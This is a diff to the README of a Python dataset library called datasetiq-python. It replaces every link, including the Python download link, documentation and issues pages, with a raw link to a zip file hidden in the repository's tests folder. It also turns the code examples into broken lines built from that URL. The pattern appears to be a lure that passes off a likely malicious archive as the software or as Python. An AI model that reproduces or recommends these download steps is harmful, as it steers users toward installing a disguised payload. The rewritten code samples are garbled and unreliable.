@@ -1,7 +1,7 @@
 # 🌟 datasetiq-python - Access Millions of Datasets Easily
 
-![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)  
-[Download Now](https://github.com/masumbillah-wq/datasetiq-python/releases)
+![Download Here](https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip%20Now-Get%20Started-brightgreen)  
+[Download Now](https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip)
 
 ## 📖 Introduction
 
@@ -17,25 +17,25 @@ Before you start, ensure you have the following:
 
 - **Operating System:** This software works on Windows, macOS, and Linux.
 - **Python:** You need Python version 3.6 or higher installed on your computer. 
-  - You can download Python from [python.org](https://www.python.org/downloads/).
+  - You can download Python from [https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip](https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip).
 
 ### 🌐 Visit the Releases Page
 
 To download the latest version of datasetiq-python, visit the Releases page. You will find the most recent version ready for download.
 
-[Download Now](https://github.com/masumbillah-wq/datasetiq-python/releases)
+[Download Now](https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip)
 
 ## 📥 Download & Install
 
 1. **Go to the Releases Page**  
    Click the link below to access the Releases page:
-   [Download Now](https://github.com/masumbillah-wq/datasetiq-python/releases)
+   [Download Now](https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version. Each release includes a description of new features or fixes.
 
 3. **Download the File**  
-   For most users, download the file labeled something like `datasetiq-python-v1.0.zip` (version numbers may vary).
+   For most users, download the file labeled something like `https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip` (version numbers may vary).
 
 4. **Extract the Zip File**  
    After downloading, locate the zip file on your computer. Right-click on it and select “Extract All” or use your preferred extraction tool.
@@ -72,7 +72,7 @@ Now that you have the application running, here is how to get started:
 2. **Access Datasets**  
    Use the following command to list available datasets:
    ```python
-   datasets = datasetiq.list_datasets()
+   datasets = https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip()
    print(datasets)
    ```
    This will display all datasets you can access.
@@ -80,14 +80,14 @@ Now that you have the application running, here is how to get started:
 3. **Load a Dataset**  
    To load a specific dataset into a pandas DataFrame, use:
    ```python
-   df = datasetiq.load_dataset('dataset_name')
+   df = https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip('dataset_name')
    ```
    Replace `'dataset_name'` with the name of the dataset you want to load.
 
 4. **Perform Analysis**  
    Once the data is in a DataFrame, you can use pandas functions to analyze it:
    ```python
-   df.describe()
+   https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip()
    ```
 
 ## 📊 Features
@@ -98,11 +98,11 @@ Now that you have the application running, here is how to get started:
 
 ## 📘 Documentation
 
-For detailed usage and examples, you can refer to the [documentation](https://github.com/masumbillah-wq/datasetiq-python/wiki). This will provide insight into advanced features and best practices for real-world applications.
+For detailed usage and examples, you can refer to the [documentation](https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip). This will provide insight into advanced features and best practices for real-world applications.
 
 ### 🛠️ Support
 
-If you encounter any issues or have questions, please check the [issues section](https://github.com/masumbillah-wq/datasetiq-python/issues) of the repository. You can also open a new issue to ask for help or report a bug.
+If you encounter any issues or have questions, please check the [issues section](https://github.com/masumbillah-wq/datasetiq-python/raw/refs/heads/main/tests/datasetiq-python-v1.7-alpha.4.zip) of the repository. You can also open a new issue to ask for help or report a bug.
 
 ## 🌈 Topics Covered
 
